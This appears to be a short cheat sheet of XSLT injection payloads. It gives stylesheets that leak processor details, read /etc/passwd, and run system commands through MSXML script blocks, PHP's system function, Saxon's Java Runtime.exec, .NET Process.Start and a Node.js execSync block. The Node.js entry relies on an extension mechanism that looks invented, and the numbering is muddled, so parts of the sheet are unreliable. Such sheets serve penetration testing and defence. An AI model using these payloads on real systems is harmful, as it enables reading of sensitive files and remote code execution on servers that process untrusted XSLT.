
## Detection - Testing for XSLT Vulnerability
1- Input: Inject a simple XSLT that outputs a unique string 
2- Input: Check for Information Disclosure
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>
```

1- Access to External Resources
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

2- Information Disclosure
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:text>, </xsl:text>
    <xsl:value-of select="system-property('xsl:vendor-url')"/>
    <xsl:text>, </xsl:text>
    <xsl:value-of select="system-property('xsl:version')"/>
  </xsl:template>
</xsl:stylesheet>
```

3- Script Execution (MSXML)
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

  <msxsl:script language="JScript" implements-prefix="user">
    function xml(nodelist) {
      var r = new ActiveXObject("WScript.Shell");
      r.Run("cmd.exe /c calc.exe");
      return nodelist.nextNode().xml;
    }
  </msxsl:script>

  <xsl:template match="/">
    <xsl:value-of select="user:xml(.)"/>
  </xsl:template>

</xsl:stylesheet>
```

4- PHP Extension Exploitation
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

5- Java Extension Exploitation (Saxon)
```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:java="http://saxon.sf.net/java-type">
  <xsl:template match="/">
    <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /c calc')" 
    xmlns:Runtime="java:java.lang.Runtime"/>
  </xsl:template>
</xsl:stylesheet>
```

6- .NET Extension Exploitation
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:cs="http://csharp.com/mynamespace">

  <msxsl:script language="C#" implements-prefix="cs">
    public string execute() {
      System.Diagnostics.Process.Start("calc.exe");
      return "";
    }
  </msxsl:script>

  <xsl:template match="/">
    <xsl:value-of select="cs:execute()"/>
  </xsl:template>

</xsl:stylesheet>
```
7- Node.js Extension Exploitation
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:node="http://nodejskit.com/ns">

  <!-- Using node-libxslt -->
  <node:script>
    const { execSync } = require('child_process');
    exports.runCommand = function() {
      return execSync('id').toString();
    };
  </node:script>

  <xsl:template match="/">
    <xsl:value-of select="node:runCommand()"/>
  </xsl:template>

</xsl:stylesheet>
```
